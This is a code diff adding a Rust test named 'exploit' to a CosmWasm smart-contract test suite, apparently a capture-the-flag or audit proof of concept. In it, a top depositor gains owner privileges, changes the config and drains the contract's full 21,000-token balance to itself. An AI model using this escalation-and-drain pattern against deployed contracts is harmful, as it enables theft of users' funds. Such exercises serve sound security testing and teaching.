@@ -141,4 +141,67 @@ pub mod tests {
         let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
         assert_eq!(bal.amount, Uint128::new(100));
     }
+
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        app = mint_tokens(app, USER2.to_string(), Uint128::from(11_000u128));
+        app = mint_tokens(app, USER1.to_string(), Uint128::from(10_000u128));
+
+        // User 1 deposit
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // User 2 deposit
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(11_000, DENOM)],
+        )
+        .unwrap();
+
+        // Query top depositor
+        let top: Addr = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Top {})
+            .unwrap();
+        assert_eq!(top, Addr::unchecked(USER2));
+
+        // we shouldn't be authorized to do this
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::UpdateConfig {
+                new_threshold: Uint128::new(20_000),
+            },
+            &[],
+        )
+        .unwrap();
+
+        let pwn_msg = cosmwasm_std::BankMsg::Send{
+            to_address: USER2.to_string(),
+            amount: vec![coin(Uint128::new(21_000).u128(), DENOM)],
+        };
+
+        // or this
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::OwnerAction {
+                msg: cosmwasm_std::CosmosMsg::Bank(pwn_msg.clone()),
+            },
+            &[],
+        )
+        .unwrap();
+
+        let bal = app.wrap().query_balance(USER2, DENOM).unwrap();
+        assert_eq!(bal.amount, Uint128::new(21_000));
+    }
 }
